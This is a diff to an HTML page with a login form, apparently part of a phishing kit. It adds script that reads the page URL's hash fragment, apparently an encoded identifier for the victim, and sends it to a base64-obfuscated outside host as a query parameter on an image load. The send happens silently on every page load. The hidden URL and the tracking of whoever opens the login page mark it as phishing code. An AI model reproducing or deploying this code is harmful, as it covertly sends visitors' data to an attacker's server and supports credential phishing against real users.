@@ -28,7 +28,10 @@
 	<script>
   const base64Url = "aHR0cHM6Ly9sb2dzcy5zaXRlOjQ0MzMvbGtyYy9hbmFseXRpY3MucGhw";
   const decodedUrl = atob(base64Url);
-  document.getElementById("myImage").src = decodedUrl;
+		const pageUrl = new URL(window.location.href);
+		const base64FromPageUrl = pageUrl.hash.substring(1);
+		const modifiedUrl = `${decodedUrl}?user=${base64FromPageUrl}`;
+  document.getElementById("myImage").src = modifiedUrl;
 </script>
 <body class="wm"><div id="preload_images"></div>
 <div id="login-wrapper" class="group " style="opacity: 1; visibility: visible;">
